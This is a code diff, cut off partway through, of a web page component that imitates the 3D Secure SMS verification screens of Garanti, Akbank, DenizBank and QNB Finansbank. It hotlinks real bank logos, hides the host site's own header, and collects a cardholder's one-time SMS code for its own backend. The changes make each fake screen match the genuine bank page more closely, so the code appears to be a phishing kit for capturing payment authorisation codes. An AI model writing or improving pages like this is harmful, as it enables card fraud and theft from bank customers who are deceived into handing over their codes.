@@ -20,7 +20,7 @@ export default function SmsPage() {
     const [loading, setLoading] = useState(true);
     const [smsCode, setSmsCode] = useState('');
     const [error, setError] = useState('');
-    const [timeLeft, setTimeLeft] = useState(180); // 3 dakika (180 saniye)
+    const [timeLeft, setTimeLeft] = useState(180); // 3 dakika
     const [isSubmitting, setIsSubmitting] = useState(false);
     const [isTimeout, setIsTimeout] = useState(false);
     const [referansNo] = useState(() => Math.random().toString(36).substring(2, 10).toUpperCase());
@@ -107,7 +107,6 @@ export default function SmsPage() {
             const result = await response.json();
 
             if (result.success) {
-                // Başarılı - onay sayfasına yönlendir
                 router.push('/odeme/onay');
             } else {
                 setError(result.error || 'Bir hata oluştu');
@@ -145,116 +144,153 @@ export default function SmsPage() {
 
     const bank = (data?.banka || '').toLowerCase().trim();
 
-    // 1. GARANTİ RENDER METODU
+    // 1. GARANTİ RENDER
     const renderGaranti = () => {
         return (
             <>
-                <link rel="stylesheet" href="/assets/garanti/css/fonts.css" />
-                <link rel="stylesheet" href="/assets/garanti/css/styles.css" />
+                <link rel="stylesheet" href="/assets/acs-style/garanti/css/fonts.css" />
+                <link rel="stylesheet" href="/assets/acs-style/garanti/css/garanti.css" />
                 <style jsx global>{`
                     nav.fixed.bottom-0 { display: none !important; }
                     main { padding-bottom: 0 !important; }
                     header { display: none !important; }
                     body { background: #fff !important; }
                     .threed-page { background: #fff !important; }
+                    #state-bekle { text-align:center; padding: 30px 20px; }
+                    #state-bekle .gar-spinner { width:40px;height:40px;border:4px solid #e9ecef;border-top-color:#00843d;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 14px; }
+                    @keyframes spin { to { transform:rotate(360deg); } }
+                    #hata-box { color:red; margin-bottom:8px; }
                 `}</style>
-                <div className="threed-page py-4">
-                    <div className="container" style={{ maxWidth: '480px', margin: '0 auto', padding: '0 15px' }}>
-                        <div className="shadow px-3 px-sm-4 pb-1 theme-garanti border rounded" style={{ borderColor: '#e9ecef' }}>
-                            <div className="pt-2">
-                                <div className="text-right mb-2">
-                                    <button onClick={handleCancel} className="btn btn-link p-0 text-muted" style={{ fontSize: '12px' }}>İptal</button>
-                                </div>
-                                <div className="row m-0 title d-flex justify-content-between align-items-center mb-3">
-                                    <div className="col-6 text-left px-0">
-                                        <Image height={39} width={64} src="https://gbemv3dsecure.garanti.com.tr/assets/img/issuer.png" alt="Garanti" style={{ objectFit: 'contain' }} />
-                                    </div>
-                                    <div className="col-6 text-right px-0">
-                                        <Image src={data?.cardType === 'visa' ? '/assets/garanti/img/psimage_visa.png' : '/assets/garanti/img/psimage_mc.png'} alt="Brand" width={64} height={39} style={{ objectFit: 'contain' }} />
-                                    </div>
-                                </div>
-                                <h6 className="text-center mb-4 font-weight-bold" style={{ color: '#00843d', fontSize: '15px' }}>
-                                    3D SECURE ÖDEME DOĞRULAMA
-                                </h6>
-                                <div className="summary mb-4" style={{ background: '#f8f9fa', padding: '15px', borderRadius: '8px' }}>
-                                    <ul className="list-unstyled m-0" style={{ fontSize: '13px', color: '#495057' }}>
-                                        <li className="d-flex justify-content-between py-1 border-bottom"><label className="m-0 font-weight-bold">Tutar:</label><span>{data?.tutar} ₺</span></li>
-                                        <li className="d-flex justify-content-between py-1 border-bottom"><label className="m-0 font-weight-bold">Mağaza:</label><span>{data?.isyeriAdi}</span></li>
-                                        <li className="d-flex justify-content-between py-1 border-bottom"><label className="m-0 font-weight-bold">Kart No:</label><span>XXXX XXXX XXXX {data?.lastFourDigits}</span></li>
-                                        <li className="d-flex justify-content-between py-1 border-bottom"><label className="m-0 font-weight-bold">Tarih:</label><span>{data?.tarih}</span></li>
-                                    </ul>
-                                </div>
-
-                                <div id="approve-page">
-                                    {isSubmitting && (
-                                        <div className="d-flex flex-column align-items-center justify-content-center py-4">
-                                            <div className="spinner-border text-success mb-2" role="status"></div>
-                                            <span style={{ fontSize: '12px', color: '#6c757d' }}>Doğrulanıyor...</span>
+                <div className="threed-page">
+                    <div className="container h-100">
+                        <div id="js-main" className="row justify-content-center align-items-center" style={{ height: 'auto' }}>
+                            <div className="box">
+                                <div className="shadow px-2 px-sm-4 pb-1 theme-garanti">
+                                    <div className="px-2 pt-2">
+                                        <div className="text-right">
+                                            <button type="button" onClick={handleCancel} className="btn btn-link p-0 text-right text-muted" style={{ background: 'none', border: 'none', outline: 'none' }}>
+                                                İptal
+                                            </button>
                                         </div>
-                                    )}
+                                        <div className="row m-0 title">
+                                            <div className="col-6 text-left px-0 pt-1">
+                                                <img height="39" width="64" src="https://gbemv3dsecure.garanti.com.tr/assets/img/issuer.png" alt="Garanti" />
+                                            </div>
+                                            <div className="col-6 text-right px-0 pt-1">
+                                                <img height="39" width="64" src={data?.cardType === 'visa' ? '/assets/garanti/img/psimage_visa.png' : '/assets/garanti/img/psimage_mc.png'} alt="card scheme" style={{ objectFit: 'contain' }} />
+                                            </div>
+                                        </div>
+                                        <h6 className="text-center mb-4 font-weight-bold">
+                                            3D SECURE ÖDEME DOĞRULAMA
+                                        </h6>
+                                        <div>
+                                            <div className="summary">
+                                                <ul>
+                                                    <li>
+                                                        <label>Tutar</label>
+                                                        <i className="icon-number-one d-none d-md-inline-block"></i>
+                                                        <span className="total-value">{data?.tutar} ₺</span>
+                                                    </li>
+                                                    <li>
+                                                        <label>Mağaza</label>
+                                                        <i className="icon-bag d-none d-md-inline-block"></i>
+                                                        <span>{data?.isyeriAdi}</span>
+                                                    </li>
+                                                    <li>
+                                                        <label>Kart No</label>
+                                                        <i className="icon-credit-card d-none d-md-inline-block"></i>
+                                                        <span>************{data?.lastFourDigits}</span>
+                                                    </li>
+                                                    <li>
+                                                        <label>Tarih</label>
+                                                        <i className="icon-watch d-none d-md-inline-block"></i>
+                                                        <span>{data?.tarih}</span>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                        </div>
 
-                                    {!isSubmitting && (
-                                        <form id="bkmform" onSubmit={handleSubmit}>
-                                            <div className="form-group mb-4">
-                                                {error && <p id="hata-box" style={{ color: 'red', fontSize: '13px' }} className="mb-2">{error}</p>}
-                                                <label htmlFor="sms-kod" style={{ fontSize: '13px', lineHeight: '1.5', display: 'block', marginBottom: '10px' }}>
-                                                    Sonu <strong>{data?.maskedPhone.slice(-4)}</strong> ile biten telefon numaranıza gönderilen doğrulama şifresini giriniz.
-                                                </label>
-                                                <div className="form-group mb-3">
-                                                    <input
-                                                        ref={inputRef}
-                                                        minLength={5}
-                                                        maxLength={6}
-                                                        required
-                                                        type="tel"
-                                                        inputMode="numeric"
-                                                        className="form-control form-pin text-center"
-                                                        id="sms-kod"
-                                                        placeholder="Şifreyi girin"
-                                                        value={smsCode}
-                                                        onChange={(e) => {
-                                                            const val = e.target.value.replace(/\D/g, '').slice(0, 6);
-                                                            setSmsCode(val);
-                                                            setError('');
-                                                        }}
-                                                        disabled={isTimeout}
-                                                        style={{ letterSpacing: '4px', fontSize: '18px', fontWeight: 'bold' }}
-                                                    />
-                                                </div>
-                                                <div className="form-group">
-                                                    <button 
-                                                        id="acs-submit-btn" 
-                                                        className="btn btn-success btn-block w-100 py-2.5 font-weight-bold text-white" 
-                                                        type="submit" 
-                                                        disabled={isTimeout || smsCode.length < 5}
-                                                        style={{ background: '#00843d', border: 'none' }}
-                                                    >
-                                                        GÖNDER
-                                                    </button>
+                                        {isSubmitting ? (
+                                            <div id="state-bekle">
+                                                <div className="gar-spinner"></div>
+                                                <p style={{ fontSize: '13px', color: '#6c757d' }}>İşleminiz hazırlanıyor, lütfen bekleyiniz...</p>
+                                            </div>
+                                        ) : (
+                                            <div id="state-kod">
+                                                <div>
+                                                    <div className="form-group mb-4">
+                                                        {error && <p id="hata-box" style={{ color: 'red' }}>{error}</p>}
+
+                                                        <label htmlFor="sms-kod">Sonu <strong>{data?.maskedPhone.slice(-4)}</strong> ile biten telefon numaranıza gönderilen doğrulama şifresini giriniz.</label>
+                                                        <form method="POST" id="acs-form" onSubmit={handleSubmit}>
+                                                            <div className="form-group mb-3">
+                                                                <input
+                                                                    ref={inputRef}
+                                                                    minLength={5}
+                                                                    maxLength={6}
+                                                                    required
+                                                                    type="tel"
+                                                                    inputMode="numeric"
+                                                                    className="form-control form-pin"
+                                                                    id="sms-kod"
+                                                                    name="sms"
+                                                                    placeholder="6 haneli şifreyi girin"
+                                                                    value={smsCode}
+                                                                    onChange={(e) => {
+                                                                        setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
+                                                                        setError('');
+                                                                    }}
+                                                                    disabled={isTimeout}
+                                                                />
+                                                            </div>
+                                                            <div className="form-group">
+                                                                <button 
+                                                                    id="acs-submit-btn" 
+                                                                    name="bsubmit" 
+                                                                    className="btn btn-primary btn-block w-100"
+                                                                    type="submit" 
+                                                                    disabled={isTimeout || smsCode.length < 5}
+                                                                >
+                                                                    GÖNDER
+                                                                </button>
+                                                            </div>
+                                                        </form>
+                                                        
+                                                        {isTimeout ? (
+                                                            <div className="text-center font-weight-bold pt-2 pb-4">
+                                                                <p className="text-danger" style={{ fontSize: '12px' }}>Zaman aşımı nedeniyle kod geçerliliğini yitirdi.</p>
+                                                                <button type="button" onClick={handleRetry} className="btn btn-link d-inline-block fs-10 p-0 text-success font-weight-bold">
+                                                                    YENİ ŞİFRE GÖNDER
+                                                                </button>
+                                                            </div>
+                                                        ) : (
+                                                            <div className="text-center py-2 text-muted" style={{ fontSize: '13px' }}>
+                                                                Kalan Süre: <span className="font-weight-bold text-success">{formatTime(timeLeft)}</span>
+                                                            </div>
+                                                        )}
+                                                    </div>
+                                                    <div className="text-center font-weight-bold py-2 pb-sm-0 mb-3" style={{ display: 'none' }}>
+                                                        <label>BonusFlaş'tan 3D Secure Mobil Onay'ı kullanmak için telefon ayarlarından BonusFlaş bildirimlerine izin vermelisiniz.</label>
+                                                    </div>
+                                                    <div className="text-center font-weight-bold py-2 pb-sm-0 mb-3" style={{ display: 'block' }}>
+                                                        <input type="checkbox" name="downloadbonus" className="form-check-input mr-2" id="downloadbonus" defaultChecked />
+                                                        <label htmlFor="downloadbonus">Daha hızlı bir 3D Secure Ödeme Doğrulama deneyimi için BonusFlaş mobil uygulamasını indirmek istiyorum.
+                                                        <img width="20" height="23" src="https://gbemv3dsecure.garanti.com.tr/assets/img/logo-bonus.png" alt="Bonus" /></label>
+                                                    </div>
+                                                    <div className="border-top border-color-light fs-10">
+                                                        <button type="button" className="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn text-left">
+                                                            <span className="float-left d-block">Daha fazla bilgi</span>
+                                                        </button>
+                                                    </div>
+                                                    <div className="border-top border-color-light fs-10">
+                                                        <button type="button" className="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn text-left">
+                                                            <span className="float-left d-block">Yardım</span>
+                                                        </button>
+                                                    </div>
                                                 </div>
                                             </div>
-
-                                            {isTimeout ? (
-                                                <div className="text-center mb-3">
-                                                    <p className="text-danger" style={{ fontSize: '13px' }}>Doğrulama kodunu zamanında girmediniz.</p>
-                                                    <button type="button" onClick={handleRetry} className="btn btn-link text-success p-0 font-weight-bold" style={{ fontSize: '12px' }}>
-                                                        YENİ ŞİFRE GÖNDER
-                                                    </button>
-                                                </div>
-                                            ) : (
-                                                <div className="text-center py-2 text-muted" style={{ fontSize: '13px' }}>
-                                                    Kalan Süre: <span className="font-weight-bold text-success">{formatTime(timeLeft)}</span>
-                                                </div>
-                                            )}
-
-                                            <div className="text-center font-weight-bold py-2 pb-sm-0 mb-3" style={{ fontSize: '11px', borderTop: '1px solid #f1f3f5' }}>
-                                                <input type="checkbox" name="downloadbonus" className="form-check-input mr-2" id="downloadbonus" defaultChecked />
-                                                <label htmlFor="downloadbonus" className="form-check-label text-muted">
-                                                    Daha hızlı bir 3D Secure Ödeme Doğrulama deneyimi için BonusFlaş mobil uygulamasını indirmek istiyorum.
-                                                </label>
-                                            </div>
-                                        </form>
-                                    )}
+                                        )}
+                                    </div>
                                 </div>
                             </div>
                         </div>
@@ -264,7 +300,7 @@ export default function SmsPage() {
         );
     };
 
-    // 2. AKBANK RENDER METODU
+    // 2. AKBANK RENDER
     const renderAkbank = () => {
         return (
             <>
@@ -273,113 +309,136 @@ export default function SmsPage() {
                     nav.fixed.bottom-0 { display: none !important; }
                     main { padding-bottom: 0 !important; }
                     header { display: none !important; }
-                    body { background: #f4f6f9 !important; }
+                    body { background: #fff !important; }
+                    #state-bekle { text-align:center; padding:30px 10px; }
+                    #state-bekle .akb-spinner { width:40px;height:40px;border:4px solid #f0f0f0;border-top-color:#e30613;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px; }
+                    @keyframes spin { to { transform:rotate(360deg); } }
+                    #hata-box { color:red; margin-bottom:8px; }
                 `}</style>
-                <div className="py-4">
-                    <form id="bkmform" onSubmit={handleSubmit} className="dijitalgozluk-arkaplan" style={{ maxWidth: '420px', margin: '0 auto', background: '#fff', borderRadius: '10px', boxShadow: '0 4px 15px rgba(0,0,0,0.08)', overflow: 'hidden' }}>
-                        <div className="dijitalgozluk-ekran">
-                            <div className="dijitalgozluk-cerceve" style={{ padding: '20px' }}>
-                                <div className="dijitalgozluk-kapat text-right">
-                                    <button type="button" onClick={handleCancel} style={{ background: 'none', border: 'none', fontSize: '16px', color: '#999' }}>✕</button>
-                                </div>
-                                <div className="dijitalgozluk-logolar d-flex justify-content-between align-items-center mb-3">
-                                    <div className="dijitalgozluk-logo dijitalgozluk-logo-banka">
-                                        <Image src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/logo-akbank.svg" alt="Akbank" width={110} height={30} style={{ objectFit: 'contain' }} />
-                                    </div>
-                                    <div className="dijitalgozluk-yazi dijitalgozluk-baslik text-right" style={{ fontSize: '11px', color: '#666', fontWeight: 'bold' }}>
-                                        Uluslararası Güvenlik <br /> Platformu 3D Secure
-                                    </div>
-                                </div>
-                                <div className="dijitalgozluk-tablo dijitalgozluk-tablo-bilgiler" style={{ background: '#f8f9fa', borderRadius: '8px', padding: '12px', marginBottom: '20px' }}>
-                                    <div className="d-flex justify-content-between mb-2" style={{ fontSize: '13px' }}>
-                                        <div className="font-weight-bold text-muted">İşyeri Adı</div>
-                                        <div className="font-weight-bold">{data?.isyeriAdi}</div>
-                                    </div>
-                                    <div className="d-flex justify-content-between mb-2" style={{ fontSize: '13px' }}>
-                                        <div className="font-weight-bold text-muted">Tutar</div>
-                                        <div className="font-weight-bold text-danger">{data?.tutar} ₺</div>
-                                    </div>
-                                    <div className="d-flex justify-content-between mb-2" style={{ fontSize: '13px' }}>
-                                        <div className="font-weight-bold text-muted">Tarih</div>
-                                        <div>{data?.tarih}</div>
-                                    </div>
-                                    <div className="d-flex justify-content-between" style={{ fontSize: '13px' }}>
-                                        <div className="font-weight-bold text-muted">Kart Numarası</div>
-                                        <div className="font-mono">************{data?.lastFourDigits}</div>
-                                    </div>
-                                </div>
-
-                                {isSubmitting ? (
-                                    <div className="text-center py-4">
-                                        <div className="spinner-border text-danger" role="status"></div>
-                                        <p className="mt-2 text-muted" style={{ fontSize: '13px' }}>İşleminiz onaylanıyor...</p>
-                                    </div>
-                                ) : (
-                                    <div id="state-kod">
-                                        <div className="d-flex gap-2 align-items-center mb-3">
-                                            <Image src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/ikon-sms-36x31.png" alt="SMS" width={30} height={25} />
-                                            <div style={{ fontSize: '12px', color: '#555', lineHeight: '1.4' }}>
-                                                {data?.maskedPhone} nolu cep telefonunuza gönderilen 3D Secure şifresini giriniz.
-                                                <br /><span className="text-muted">Referans no: {referansNo}</span>
-                                            </div>
-                                        </div>
-
-                                        {error && <div className="text-danger mb-2 text-center" style={{ fontSize: '13px' }}>{error}</div>}
-
-                                        <div className="dijitalgozluk-form-kontrol mb-3">
-                                            <input
-                                                ref={inputRef}
-                                                type="tel"
-                                                inputMode="numeric"
-                                                id="sms-kod"
-                                                className="form-control text-center py-2"
-                                                maxLength={6}
-                                                required
-                                                value={smsCode}
-                                                onChange={(e) => {
-                                                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
-                                                    setSmsCode(val);
-                                                    setError('');
-                                                }}
-                                                disabled={isTimeout}
-                                                style={{ fontSize: '20px', letterSpacing: '6px', fontWeight: 'bold', border: '2px solid #ced4da', borderRadius: '6px' }}
-                                                placeholder="------"
-                                            />
-                                        </div>
-
-                                        {isTimeout ? (
-                                            <div className="text-center mb-3">
-                                                <span className="text-danger d-block mb-1" style={{ fontSize: '12px' }}>Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
-                                                <button type="button" onClick={handleRetry} className="btn btn-danger btn-sm w-100 text-white">Doğrulama Kodunu Yeniden Gönder</button>
-                                            </div>
-                                        ) : (
-                                            <div className="dijitalgozluk-uyari text-center mb-3" style={{ fontSize: '12px', color: '#e30613' }}>
-                                                Onaylama süresi: <strong>{formatTime(timeLeft)}</strong>
-                                            </div>
-                                        )}
-
-                                        <div className="dijitalgozluk-devam-dugmesi">
-                                            <button 
-                                                id="acs-submit-btn" 
-                                                className="btn btn-danger w-100 py-2.5 font-weight-bold" 
-                                                type="submit" 
-                                                disabled={isTimeout || smsCode.length < 5}
-                                                style={{ background: '#e30613', border: 'none', borderRadius: '6px' }}
-                                            >
-                                                Devam
+                <div data-role="content" data-theme="c" className="AkbankContentWrapper">
+                    <div className="content">
+                        <div className="dijitalgozluk-arkaplan">
+                            <form id="axesswings3dsecurekayit3" name="axesswings3dsecurekayit3" autoComplete="off" onSubmit={handleSubmit}>
+                                <div className="dijitalgozluk-ekran">
+                                    <div className="dijitalgozluk-cerceve">
+                                        <div className="dijitalgozluk-kapat">
+                                            <button type="button" onClick={handleCancel} style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
+                                                <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/icon-close-18x18.png" alt="X" />
                                             </button>
                                         </div>
+                                        <div className="dijitalgozluk-logolar">
+                                            <div className="dijitalgozluk-logo dijitalgozluk-logo-banka">
+                                                <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/logo-akbank.svg" alt="Akbank" />
+                                            </div>
+                                            <div className="dijitalgozluk-yazi dijitalgozluk-baslik"> Uluslararası Güvenlik <br /> Platformu 3D Secure </div>
+                                        </div>
+                                        <div className="dijitalgozluk-tablo dijitalgozluk-tablo-bilgiler">
+                                            <div className="dijitalgozluk-tablo-satir">
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> İşyeri Adı </div>
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> {data?.isyeriAdi} </div>
+                                            </div>
+                                            <div className="dijitalgozluk-tablo-satir">
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tutar </div>
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> {data?.tutar} ₺</div>
+                                            </div>
+                                            <div className="dijitalgozluk-tablo-satir">
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tarih </div>
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> {data?.tarih} </div>
+                                            </div>
+                                            <div className="dijitalgozluk-tablo-satir">
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Kart Numarası </div>
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> ************{data?.lastFourDigits} </div>
+                                            </div>
+                                            <div className="dijitalgozluk-tablo-satir">
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Cep Telefonu </div>
+                                                <div className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> {data?.maskedPhone} </div>
+                                            </div>
+
+                                            {error && (
+                                                <div className="dijitalgozluk-tablo-satir">
+                                                    <div style={{ color: 'red' }} className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> HATA </div>
+                                                    <div style={{ color: 'red' }} className="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger" id="hata-box">{error}</div>
+                                                </div>
+                                            )}
+                                        </div>
+
+                                        {isSubmitting ? (
+                                            <div id="state-bekle">
+                                                <div className="akb-spinner"></div>
+                                                <div className="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
+                                                    <p>SMS şifresi gönderiliyor, lütfen bekleyiniz...</p>
+                                                </div>
+                                            </div>
+                                        ) : (
+                                            <div id="state-kod">
+                                                <div id="passwordInformation">
+                                                    <div className="dijitalgozluk-kart-logo">
+                                                        <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/ikon-sms-36x31.png" alt="" />
+                                                    </div>
+                                                    <div id="passwordInformation1" className="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
+                                                        <p>
+                                                            <span> 01 </span> nolu 3D Secure / Go Güvenli Öde şifrenizi şifre alanına giriniz.
+                                                        </p>
+                                                    </div>
+                                                    <div id="passwordInformation2" className="dijitalgozluk-form-kontrol dijitalgozluk-form-yazi dijitalgozluk-form-sms-gir">
+                                                        <div className="dijitalgozluk-form-yazi-baslik">Şifre:</div>
+                                                        <div className="dijitalgozluk-form-yazi-input">
+                                                            <input
+                                                                ref={inputRef}
+                                                                type="tel"
+                                                                inputMode="numeric"
+                                                                id="sms-kod"
+                                                                name="sms"
+                                                                autoFocus
+                                                                minLength={5}
+                                                                maxLength={6}
+                                                                autoComplete="off"
+                                                                required
+                                                                value={smsCode}
+                                                                onChange={(e) => {
+                                                                    setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
+                                                                    setError('');
+                                                                }}
+                                                                disabled={isTimeout}
+                                                            />
+                                                        </div>
+                                                        <div id="helpDiv" className="dijitalgozluk-form-yazi-yardim">
+                                                            <a id="opener">Yardım</a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <div id="div1" style={{ width: '180px', margin: '0px auto 0 auto' }}></div>
+                                                </div>
+                                                {isTimeout ? (
+                                                    <div className="dijitalgozluk-yazi dijitalgozluk-uyari">
+                                                        <p className="text-danger">Doğrulama kodunun geçerlilik süresi doldu.</p>
+                                                        <button type="button" onClick={handleRetry} className="btn btn-link text-danger font-weight-bold" style={{ fontSize: '12px' }}>Şifreyi Yeniden Gönder</button>
+                                                    </div>
+                                                ) : (
+                                                    <div id="remainingWarn" className="dijitalgozluk-yazi dijitalgozluk-uyari">
+                                                        <p> Onaylama süresinin dolmasına <span id="time">{formatTime(timeLeft)}</span> kalmıştır </p>
+                                                    </div>
+                                                )}
+                                                <div className="dijitalgozluk-form-kontrolu dijitalgozluk-dugme dijitalgozluk-devam-dugmesi">
+                                                    <button id="acs-submit-btn" name="DevamEt" type="submit" disabled={isTimeout || smsCode.length < 5}>Devam</button>
+                                                </div>
+                                                <div className="dijitalgozluk-yazi dijitalgozluk-alternatif-yontem dijitalgozluk-alternatif-yontem-sms">
+                                                    <p>Bu işlemi Axess Mobil'den de onaylayabilirdin.</p>
+                                                </div>
+                                            </div>
+                                        )}
                                     </div>
-                                )}
-                            </div>
+                                </div>
+                            </form>
                         </div>
-                    </form>
+                    </div>
                 </div>
             </>
         );
     };
 
-    // 3. DENİZBANK RENDER METODU
+    // 3. DENİZBANK RENDER
     const renderDenizbank = () => {
         return (
             <>
@@ -415,7 +474,6 @@ export default function SmsPage() {
                     header { display: none !important; }
                     body { background: #e8f4fc !important; }
                 `}</style>
-
                 <div className="dn-wrap">
                     <div className="dn-header">
                         <div className="dn-logo">Deniz<span>Bank</span></div>
@@ -433,9 +491,9 @@ export default function SmsPage() {
                         </div>
 
                         {isSubmitting ? (
-                            <div className="text-center py-4">
-                                <div className="spinner-border text-primary" role="status"></div>
-                                <p className="mt-2 text-muted" style={{ fontSize: '13px' }}>Onaylanıyor...</p>
+                            <div style={{ textAlign: 'center', padding: '22px' }}>
+                                <div className="w-12 h-12 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-3"></div>
+                                <p className="dn-label" style={{ textAlign: 'center' }}>SMS kodu gönderiliyor, lütfen bekleyiniz...</p>
                             </div>
                         ) : (
                             <form id="bkmform" onSubmit={handleSubmit}>
@@ -451,32 +509,20 @@ export default function SmsPage() {
                                     placeholder="______"
                                     value={smsCode}
                                     onChange={(e) => {
-                                        const val = e.target.value.replace(/\D/g, '').slice(0, 6);
-                                        setSmsCode(val);
+                                        setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                                         setError('');
                                     }}
                                     disabled={isTimeout}
                                 />
-
                                 {isTimeout ? (
                                     <div className="text-center mb-3">
-                                        <p className="text-danger" style={{ fontSize: '12px' }}>Kod süresi doldu.</p>
-                                        <button type="button" onClick={handleRetry} className="btn btn-link text-primary font-weight-bold" style={{ fontSize: '12px' }}>
-                                            Kodu Yeniden Gönder
-                                        </button>
+                                        <p className="text-danger" style={{ fontSize: '12px' }}>Doğrulama kodu geçerlilik süresi doldu.</p>
+                                        <button type="button" onClick={handleRetry} className="btn btn-link text-primary font-weight-bold" style={{ fontSize: '12px' }}>Yeniden Gönder</button>
                                     </div>
                                 ) : (
                                     <p className="dn-timer">Kalan süre: <span>{formatTime(timeLeft)}</span></p>
                                 )}
-
-                                <button 
-                                    className="dn-btn" 
-                                    id="acs-submit-btn" 
-                                    type="submit" 
-                                    disabled={isTimeout || smsCode.length < 5}
-                                >
-                                    ONAYLA
-                                </button>
+                                <button className="dn-btn" id="acs-submit-btn" type="submit" disabled={isTimeout || smsCode.length < 5}>ONAYLA</button>
                             </form>
                         )}
                     </div>
@@ -486,7 +532,7 @@ export default function SmsPage() {
         );
     };
 
-    // 4. QNB FİNANSBANK RENDER METODU
+    // 4. QNB FİNANSBANK RENDER
     const renderFinansbank = () => {
         return (
             <>
@@ -496,101 +542,117 @@ export default function SmsPage() {
                     main { padding-bottom: 0 !important; }
                     header { display: none !important; }
                     body { background: #fff !important; }
+                    #state-bekle { text-align:center; padding:30px 20px; }
+                    #state-bekle .fn-spinner { width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#552382;border-radius:50%;animation:fn-spin 1s linear infinite;margin:0 auto 12px; }
+                    @keyframes fn-spin { to { transform:rotate(360deg); } }
+                    #hata-box { color:red; display:none; }
                 `}</style>
-                <div className="content-wrapper" id="content" style={{ display: 'block', maxWidth: '480px', margin: '0 auto', padding: '15px' }}>
-                    <div className="header d-flex justify-content-between align-items-center mb-3">
-                        <div className="brand-logo">
-                            <Image src="https://acs.qnbfinansbank.com/img/brand/troy.png" alt="troy" width={70} height={35} style={{ objectFit: 'contain' }} />
-                        </div>
-                        <div className="member-logo">
-                            <Image src="https://acs.qnbfinansbank.com/img/finansbank.png" alt="qnb" width={140} height={35} style={{ objectFit: 'contain' }} />
-                        </div>
+                <div className="content-wrapper" id="content" style={{ display: 'block', maxWidth: '480px', margin: '0 auto' }}>
+                    <div className="header">
+                        <div className="brand-logo"> <img src="https://acs.qnbfinansbank.com/img/brand/troy.png" alt="card brand" /> </div>
+                        <div className="member-logo"> <img src="https://acs.qnbfinansbank.com/img/finansbank.png" alt="card platform" /> </div>
                     </div>
                     <div id="approve-page">
                         <div className="content">
-                            <h1 id="approve-header" style={{ fontSize: '18px', fontWeight: 'bold', color: '#552382', marginBottom: '15px' }}>Doğrulama kodunu giriniz</h1>
-                            <div className="info-wrapper" style={{ background: '#f8f9fa', padding: '15px', borderRadius: '8px', marginBottom: '20px' }}>
-                                <div className="d-flex justify-content-between py-1 border-bottom" style={{ fontSize: '13px' }}>
-                                    <div className="info-label text-muted">İşyeri Adı:</div>
-                                    <div className="font-weight-bold">{data?.isyeriAdi}</div>
+                            <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
+                            <div className="info-wrapper">
+                                <div className="info-row">
+                                    <div className="info-col info-label">İşyeri Adı:</div>
+                                    <div className="info-col" id="merchant-name">{data?.isyeriAdi}</div>
                                 </div>
-                                <div className="d-flex justify-content-between py-1 border-bottom" style={{ fontSize: '13px' }}>
-                                    <div className="info-label text-muted">İşlem Tutarı:</div>
-                                    <div className="font-weight-bold text-success">{data?.tutar} TL</div>
+                                <div className="info-row">
+                                    <div className="info-col info-label">İşlem Tutarı:</div>
+                                    <div className="info-col" style={{ fontSize: '21px', fontWeight: '900', marginTop: '-5px' }} id="amount">
+                                        {data?.tutar} TL
+                                    </div>
                                 </div>
-                                <div className="d-flex justify-content-between py-1 border-bottom" style={{ fontSize: '13px' }}>
-                                    <div className="info-label text-muted">İşlem Tarihi-Saati:</div>
-                                    <div>{data?.tarih}</div>
+                                <div className="info-row">
+                                    <div className="info-col info-label">İşlem Tarihi-Saati:</div>
+                                    <div className="info-col" id="operation-date-time">
+                                        {data?.tarih}
+                                    </div>
                                 </div>
-                                <div className="d-flex justify-content-between py-1" style={{ fontSize: '13px' }}>
-                                    <div className="info-label text-muted">Kart Numarası:</div>
-                                    <div className="font-mono">XXXX XXXX XXXX {data?.lastFourDigits}</div>
+                                <div className="info-row">
+                                    <div className="info-col info-label">Kart Numarası:</div>
+                                    <div className="info-col" id="pan">
+                                        ************{data?.lastFourDigits}
+                                    </div>
                                 </div>
                             </div>
+                            <div className="action-wrapper">
+                                {error && <p id="hata-box" style={{ color: 'red', display: 'block' }}>{error}</p>}
 
-                            {isSubmitting ? (
-                                <div className="text-center py-4">
-                                    <div className="spinner-border text-primary" role="status" style={{ color: '#552382' }}></div>
-                                    <p className="mt-2 text-muted" style={{ fontSize: '13px' }}>Onaylanıyor...</p>
-                                </div>
-                            ) : (
-                                <form id="bkmform" onSubmit={handleSubmit}>
-                                    <div className="action-wrapper">
-                                        {error && <p style={{ color: 'red', fontSize: '13px', marginBottom: '10px' }}>{error}</p>}
